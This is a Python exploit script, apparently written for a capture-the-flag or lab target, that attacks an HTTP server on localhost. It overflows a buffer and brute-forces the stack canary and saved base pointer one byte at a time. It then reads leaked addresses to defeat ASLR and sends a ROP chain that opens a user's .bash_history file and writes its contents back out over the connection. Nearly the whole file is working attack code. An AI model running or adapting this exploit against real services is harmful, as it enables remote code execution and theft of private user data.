from requests import Request, Session
from collections import OrderedDict
from pwn import *
import socket


def connect_send_check_good(buf1=b"a" * 4080, buf2=cyclic(520), check=0):

    remote_ip = "127.0.0.1"
    remote_port = 8080

    http_header = b"POST / HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nAccept-Encoding: identity\r\nContent-Length: 99999999\r\n\r\n"

    http_data_1 = buf1
    http_data_2 = buf2

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remote_ip, remote_port))

    while True:
        # with open("../psuser/ps_server.log", "r") as f:
        with open("ps_server.log", "r") as f:
            x = f.readlines()
            if "handling" in x[-1]:
                port = x[-1].split(" ")[1]
                break

    s.send(http_header)
    s.send(http_data_1)
    time.sleep(0.1)
    s.send(http_data_2)

    px = "00000"

    while port != px:
        # with open("../psuser/ps_server.log", "r") as f:
        with open("ps_server.log", "r") as f:
            x = f.readlines()
            if not "handling" in x[-1]:
                px = x[-1].strip().split(" ")[1]
                signal = x[-1].strip().split(" ")[-1]
    if signal == str(check):
        print(f"Success! Sig: {signal}")
        return True
    else:
        print(f"x:{signal}, ", end="")
        return False


buf = b"A" * 24

connect_send_check = connect_send_check_good

# substitute known canary for testing
# buf += bytes.fromhex("00e5b3f8d633f4e8")

for y in range(1, 9):
    print(f"\nForcing Canary Byte {y}")

    for x in range(0, 256):
        if connect_send_check(buf2=buf + x.to_bytes(1, "big"), check=0):
            buf += x.to_bytes(1, "big")
            print(f"Working: {buf.hex()}")
            break

print(f"Solved Stack Canary: {buf[-8:].hex()}")

# currently buffer contains padding and stack canary. Now we crack base pointer
# padding gets popped into RBX, R12

buf += b"B" * 8 + b"C" * 8

# substitute known rbp for testing
# buf += bytes.fromhex("ff7fffffff7f0000")

for y in range(1, 9):
    print(f"\nForcing %RBP Byte {y}")

    # try most common values first
    for x in [255, 127] + list(range(256)):
        if connect_send_check(buf2=buf + x.to_bytes(1, "big"), check=0):
            buf += x.to_bytes(1, "big")
            print(f"Working: {buf.hex()}")
            break

print(f"Solved %rbp: {buf[-8:].hex()}")

print(buf.hex())

connect_send_check(buf2=buf + bytes.fromhex("be"))

with open("../psuser/ps_data.log", "rb") as f:
    x = f.read()

i = 0

stack_leak = u64(x[-134:-126])
code2_leak = u64(x[-102:-94])
code_leak = u64(x[-6:] + i.to_bytes(2, "big"))

print(
    f"Got some leaks: Code: {hex(code_leak)}, {hex(code2_leak)} and Stack: {hex(stack_leak)}"
)

# calculate offsets

stack = stack_leak - 0x1F950
code2 = code2_leak - 0x5C40
code = code_leak - 0x6D4A9

print(
    f"Calculated some Offsets: Code {hex(code)}, {hex(code2)} and Stack: {hex(stack)}"
)


#
#
# ROP TIME
#
#

scratch_space = code2 + 0x100
string = code + 0x148
pop_rdi = code + 0x8876
pop_rdx_rsi = code + 0x590F9
pop_rax = code + 0x877F
syscall = code + 0x52A25  # : syscall ; ret
www = code + 0x5099B

i = 0

# write filename
buf += p64(pop_rdi)
buf += p64(scratch_space)
buf += p64(pop_rdx_rsi)
buf += b"DDDDDDDD"
buf += b"/home/ps"
buf += p64(www)

buf += p64(pop_rdi)
buf += p64(scratch_space + 8)
buf += p64(pop_rdx_rsi)
buf += b"DDDDDDDD"
buf += b"user/.ba"
buf += p64(www)

buf += p64(pop_rdi)
buf += p64(scratch_space + 16)
buf += p64(pop_rdx_rsi)
buf += b"DDDDDDDD"
buf += b"sh_histo"
buf += p64(www)

buf += p64(pop_rdi)
buf += p64(scratch_space + 24)
buf += p64(pop_rdx_rsi)
buf += b"DDDDDDDD"
buf += b"ry" + bytes.fromhex("000000000000")
buf += p64(www)

buf += p64(pop_rdi)
buf += p64(scratch_space + 32)
buf += p64(pop_rdx_rsi)
buf += b"DDDDDDDD"
buf += p64(0)
buf += p64(www)

# open
buf += p64(pop_rdi)
buf += p64(scratch_space)
buf += p64(pop_rdx_rsi)
buf += p64(0)
buf += p64(0)
buf += p64(pop_rax)
buf += p64(0x2)
buf += p64(syscall)

# read
buf += p64(pop_rdi)
buf += p64(5)
buf += p64(pop_rdx_rsi)
buf += p64(0x1000)
buf += p64(scratch_space + 64)
buf += p64(pop_rax)
buf += p64(0)
buf += p64(syscall)

# read
buf += p64(pop_rdi)
buf += p64(3)
buf += p64(pop_rdx_rsi)
buf += p64(0x1000)
buf += p64(scratch_space + 64)
buf += p64(pop_rax)
buf += p64(1)
buf += p64(syscall)

# exit
buf += p64(pop_rdi)
buf += p64(69)
buf += p64(pop_rax)
buf += p64(60)
buf += p64(syscall)

input("[Return to Continue]")
connect_send_check_good(buf2=buf)


# log = 3
# data = 4
